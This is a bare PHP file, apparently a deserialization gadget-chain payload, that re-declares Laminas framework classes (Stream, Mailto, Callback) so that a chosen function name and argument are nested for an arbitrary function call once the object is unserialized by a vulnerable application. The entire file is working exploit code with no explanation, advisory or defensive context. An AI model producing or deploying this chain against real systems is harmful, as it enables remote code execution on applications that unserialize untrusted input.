<?php

namespace Laminas\Http\Response
{
   class Stream
   {
      protected $cleanup=true;
      protected $streamName;

      function __construct($function,$parameter)
      {
         $this->streamName = new \Laminas\Uri\Mailto($function,$parameter);
      }
   }
}

namespace Laminas\Uri
{
   class Mailto
   {
      protected $path;
      protected $emailValidator;

      function __construct($function,$parameter)
      {
         $this->path = $parameter;
         $this->emailValidator = new \Laminas\Validator\Callback($function);
      }
   }
}

namespace Laminas\Validator
{
   class Callback
   {
      protected $options=[];

      function __construct($function)
      {
         $this->options["callback"]=$function;
      }
   }
}